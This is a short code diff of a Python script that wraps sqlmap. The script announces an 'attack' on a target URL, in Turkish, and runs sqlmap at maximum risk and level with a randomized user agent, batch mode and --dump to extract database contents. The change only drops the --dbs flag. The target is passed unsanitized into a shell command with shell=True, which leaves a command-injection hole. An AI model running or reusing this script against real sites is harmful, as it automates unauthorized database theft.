@@ -5,7 +5,7 @@ import subprocess
 
 def run_sqlmap(target):
     print("[*] Şu adrese saldırı başlatılıyor: {}".format(target))
-    sqlmap_command = "sqlmap -u {} --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs --dump".format(target)
+    sqlmap_command = "sqlmap -u {} --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dump".format(target)
     subprocess.call(sqlmap_command, shell=True)
 
 if __name__ == "__main__":
